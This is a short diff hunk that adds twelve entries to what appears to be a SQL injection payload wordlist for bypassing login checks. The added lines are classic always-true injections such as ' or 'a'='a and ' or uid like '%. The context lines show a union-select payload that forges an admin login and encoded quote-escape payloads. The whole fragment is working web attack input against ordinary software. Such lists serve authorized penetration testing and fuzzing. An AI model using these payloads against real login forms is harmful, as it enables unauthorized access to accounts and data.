@@ -802,3 +802,15 @@ Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
 %A8%27)||1-- 2
 %8C%A8%27)||1-- 2
 %bf')||1-- 2
+' or 'a'='a
+' or a=a--
+' or a=a–
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+') or ('a'='a and hi") or ("a"="a
+' or 'one'='one
+' or 'one'='one–
+' or uid like '%
+' or uname like '%
+' or userid like '%
